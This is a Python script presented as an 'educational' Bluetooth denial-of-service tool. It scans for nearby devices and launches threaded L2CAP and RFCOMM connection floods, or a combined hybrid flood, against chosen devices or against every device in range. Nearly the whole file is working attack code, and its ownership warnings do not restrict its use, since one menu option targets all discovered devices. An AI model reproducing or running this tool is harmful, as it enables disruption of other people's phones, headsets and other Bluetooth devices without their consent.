#!/usr/bin/env python3
"""
Bluetooth DOS Tool - Educational Purpose Only
WARNING: Use only on devices you own. Unauthorized access is illegal.
"""

import os
import sys
import time
import subprocess
import threading
from typing import List, Dict, Optional

try:
    import bluetooth
except ImportError:
    print("PyBluez not installed. Please run: pip install pybluez")
    sys.exit(1)


class BluetoothDOS:
    def __init__(self):
        self.devices: List[Dict[str, str]] = []
        self.attack_threads: Dict[str, threading.Thread] = {}
        self.attack_active: Dict[str, bool] = {}
        self.stop_flags: Dict[str, threading.Event] = {}
        
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('clear' if os.name != 'nt' else 'cls')
    
    def print_banner(self):
        """Display banner"""
        banner = """
╔══════════════════════════════════════════════════════════╗
║         BLUETOOTH DOS TOOL - EDUCATIONAL ONLY            ║
║                                                          ║
║  ⚠️  WARNING: Use only on devices you own!              ║
║     Unauthorized use is ILLEGAL and UNETHICAL           ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def scan_devices(self, duration: int = 8) -> List[Dict[str, str]]:
        """
        Scan for nearby Bluetooth devices
        
        Args:
            duration: Scan duration in seconds
            
        Returns:
            List of discovered devices with their addresses and names
        """
        print(f"\n[*] Scanning for Bluetooth devices (duration: {duration}s)...")
        print("[*] Please wait...\n")
        
        try:
            nearby_devices = bluetooth.discover_devices(
                duration=duration,
                lookup_names=True,
                flush_cache=True,
                lookup_class=True
            )
            
            self.devices = []
            for addr, name, device_class in nearby_devices:
                device_type = self._get_device_type(device_class)
                self.devices.append({
                    'address': addr,
                    'name': name if name else 'Unknown Device',
                    'type': device_type
                })
            
            return self.devices
            
        except Exception as e:
            print(f"[!] Error scanning devices: {e}")
            return []
    
    def _get_device_type(self, device_class: int) -> str:
        """Determine device type from class"""
        # Major device classes
        major_class = (device_class >> 8) & 0x1f
        
        device_types = {
            1: "Computer",
            2: "Phone",
            3: "Network",
            4: "Audio/Video",
            5: "Peripheral",
            6: "Imaging",
            7: "Wearable",
            8: "Toy"
        }
        
        return device_types.get(major_class, "Unknown")
    
    def display_devices(self):
        """Display discovered devices in a formatted table"""
        if not self.devices:
            print("[!] No devices found. Please run a scan first.\n")
            return
        
        print("\n╔════════════════════════════════════════════════════════════════════╗")
        print("║                    DISCOVERED BLUETOOTH DEVICES                    ║")
        print("╠═════╦══════════════════════╦═══════════════════════╦══════════════╣")
        print("║ No. ║ MAC Address          ║ Device Name           ║ Type         ║")
        print("╠═════╬══════════════════════╬═══════════════════════╬══════════════╣")
        
        for idx, device in enumerate(self.devices, 1):
            status = " [ATTACKING]" if self.attack_active.get(device['address'], False) else ""
            print(f"║ {idx:3d} ║ {device['address']:20s} ║ {device['name'][:21]:21s} ║ {device['type'][:12]:12s} ║{status}")
        
        print("╚═════╩══════════════════════╩═══════════════════════╩══════════════╝\n")
    
    def l2cap_flood(self, target_addr: str, stop_event: threading.Event):
        """
        L2CAP flood attack - overwhelms device with connection requests
        
        Args:
            target_addr: Target device MAC address
            stop_event: Event to signal when to stop attack
        """
        print(f"[+] Starting L2CAP flood attack on {target_addr}")
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Create multiple sockets and attempt connections
                sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                sock.settimeout(0.1)
                
                try:
                    # Attempt connection on various PSM values
                    for psm in [0x0001, 0x0003, 0x0005, 0x0007]:
                        if stop_event.is_set():
                            break
                        try:
                            sock.connect((target_addr, psm))
                            sock.close()
                        except:
                            pass
                        
                        packet_count += 1
                        if packet_count % 100 == 0:
                            print(f"[*] {target_addr}: {packet_count} packets sent")
                
                except Exception as e:
                    pass
                
                sock.close()
                
            except Exception as e:
                # Continue attacking even if individual attempts fail
                pass
            
            time.sleep(0.001)  # Small delay to prevent resource exhaustion
        
        print(f"[+] Stopped attack on {target_addr}. Total packets: {packet_count}")
    
    def rfcomm_flood(self, target_addr: str, stop_event: threading.Event):
        """
        RFCOMM flood attack - overwhelms device with RFCOMM connection requests
        
        Args:
            target_addr: Target device MAC address
            stop_event: Event to signal when to stop attack
        """
        print(f"[+] Starting RFCOMM flood attack on {target_addr}")
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                sock.settimeout(0.1)
                
                # Try multiple channels
                for channel in range(1, 31):
                    if stop_event.is_set():
                        break
                    try:
                        sock.connect((target_addr, channel))
                        sock.close()
                    except:
                        pass
                    
                    packet_count += 1
                    if packet_count % 50 == 0:
                        print(f"[*] {target_addr}: {packet_count} RFCOMM packets sent")
                
                sock.close()
                
            except Exception as e:
                pass
            
            time.sleep(0.001)
        
        print(f"[+] Stopped RFCOMM attack on {target_addr}. Total packets: {packet_count}")
    
    def hybrid_attack(self, target_addr: str, stop_event: threading.Event):
        """
        Hybrid attack combining L2CAP and RFCOMM flooding
        
        Args:
            target_addr: Target device MAC address
            stop_event: Event to signal when to stop attack
        """
        # Run both attacks in separate threads
        l2cap_thread = threading.Thread(
            target=self.l2cap_flood,
            args=(target_addr, stop_event),
            daemon=True
        )
        rfcomm_thread = threading.Thread(
            target=self.rfcomm_flood,
            args=(target_addr, stop_event),
            daemon=True
        )
        
        l2cap_thread.start()
        rfcomm_thread.start()
        
        l2cap_thread.join()
        rfcomm_thread.join()
    
    def start_attack(self, device_indices: List[int], attack_type: str = "hybrid"):
        """
        Start DOS attack on selected devices
        
        Args:
            device_indices: List of device indices to attack
            attack_type: Type of attack (l2cap, rfcomm, hybrid)
        """
        if not self.devices:
            print("[!] No devices available. Please scan first.")
            return
        
        for idx in device_indices:
            if idx < 1 or idx > len(self.devices):
                print(f"[!] Invalid device index: {idx}")
                continue
            
            device = self.devices[idx - 1]
            addr = device['address']
            
            if self.attack_active.get(addr, False):
                print(f"[!] Attack already active on {device['name']} ({addr})")
                continue
            
            # Create stop event
            stop_event = threading.Event()
            self.stop_flags[addr] = stop_event
            
            # Select attack method
            if attack_type == "l2cap":
                attack_func = self.l2cap_flood
            elif attack_type == "rfcomm":
                attack_func = self.rfcomm_flood
            else:
                attack_func = self.hybrid_attack
            
            # Start attack thread
            attack_thread = threading.Thread(
                target=attack_func,
                args=(addr, stop_event),
                daemon=True
            )
            
            self.attack_threads[addr] = attack_thread
            self.attack_active[addr] = True
            attack_thread.start()
            
            print(f"[+] Attack started on {device['name']} ({addr})")
    
    def stop_attack(self, device_indices: Optional[List[int]] = None):
        """
        Stop DOS attack on selected devices or all devices
        
        Args:
            device_indices: List of device indices to stop attacking (None = all)
        """
        if device_indices is None:
            # Stop all attacks
            addrs_to_stop = list(self.attack_active.keys())
        else:
            addrs_to_stop = []
            for idx in device_indices:
                if idx < 1 or idx > len(self.devices):
                    print(f"[!] Invalid device index: {idx}")
                    continue
                device = self.devices[idx - 1]
                addrs_to_stop.append(device['address'])
        
        for addr in addrs_to_stop:
            if addr in self.stop_flags:
                self.stop_flags[addr].set()
                self.attack_active[addr] = False
                print(f"[+] Stopping attack on {addr}...")
        
        time.sleep(1)  # Give threads time to stop
    
    def stop_all_attacks(self):
        """Stop all active attacks"""
        self.stop_attack(None)


def main():
    dos_tool = BluetoothDOS()
    
    # Check if running as root on Unix systems
    if os.name != 'nt' and os.geteuid() != 0:
        print("[!] WARNING: This tool may require root privileges on some systems.")
        print("[!] If you encounter permission errors, try running with sudo.\n")
    
    while True:
        dos_tool.clear_screen()
        dos_tool.print_banner()
        
        print("\n[MAIN MENU]")
        print("1. Scan for Bluetooth devices")
        print("2. Display discovered devices")
        print("3. Start DOS attack (select devices)")
        print("4. Start DOS attack (ALL devices)")
        print("5. Stop attack (select devices)")
        print("6. Stop ALL attacks")
        print("7. Exit")
        print("\n" + "="*60)
        
        choice = input("\n[>] Enter your choice: ").strip()
        
        if choice == "1":
            duration = input("[>] Enter scan duration in seconds [default: 8]: ").strip()
            duration = int(duration) if duration.isdigit() else 8
            
            devices = dos_tool.scan_devices(duration)
            print(f"\n[+] Found {len(devices)} device(s)")
            
            if devices:
                dos_tool.display_devices()
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "2":
            dos_tool.display_devices()
            input("\n[Press Enter to continue...]")
        
        elif choice == "3":
            dos_tool.display_devices()
            
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            indices_input = input("\n[>] Enter device numbers to attack (comma-separated, e.g., 1,3,5): ").strip()
            
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                
                print("\n[ATTACK TYPE]")
                print("1. L2CAP Flood (fast)")
                print("2. RFCOMM Flood (comprehensive)")
                print("3. Hybrid (both - recommended)")
                attack_choice = input("\n[>] Select attack type [default: 3]: ").strip()
                
                attack_type_map = {"1": "l2cap", "2": "rfcomm", "3": "hybrid"}
                attack_type = attack_type_map.get(attack_choice, "hybrid")
                
                dos_tool.start_attack(indices, attack_type)
                print("\n[+] Attack(s) initiated!")
                
            except ValueError:
                print("[!] Invalid input format")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "4":
            dos_tool.display_devices()
            
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            confirm = input("\n[!] Attack ALL devices? This will target all discovered devices! (yes/no): ").strip().lower()
            
            if confirm == "yes":
                print("\n[ATTACK TYPE]")
                print("1. L2CAP Flood (fast)")
                print("2. RFCOMM Flood (comprehensive)")
                print("3. Hybrid (both - recommended)")
                attack_choice = input("\n[>] Select attack type [default: 3]: ").strip()
                
                attack_type_map = {"1": "l2cap", "2": "rfcomm", "3": "hybrid"}
                attack_type = attack_type_map.get(attack_choice, "hybrid")
                
                all_indices = list(range(1, len(dos_tool.devices) + 1))
                dos_tool.start_attack(all_indices, attack_type)
                print("\n[+] Attack started on ALL devices!")
            else:
                print("[+] Operation cancelled")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "5":
            dos_tool.display_devices()
            
            indices_input = input("\n[>] Enter device numbers to stop attacking (comma-separated): ").strip()
            
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                dos_tool.stop_attack(indices)
                print("\n[+] Attack(s) stopped!")
                
            except ValueError:
                print("[!] Invalid input format")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "6":
            confirm = input("\n[!] Stop ALL active attacks? (yes/no): ").strip().lower()
            
            if confirm == "yes":
                dos_tool.stop_all_attacks()
                print("\n[+] All attacks stopped!")
            else:
                print("[+] Operation cancelled")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "7":
            print("\n[+] Stopping all active attacks...")
            dos_tool.stop_all_attacks()
            print("[+] Exiting. Stay ethical!")
            sys.exit(0)
        
        else:
            print("[!] Invalid choice. Please try again.")
            input("\n[Press Enter to continue...]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Cleaning up...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)

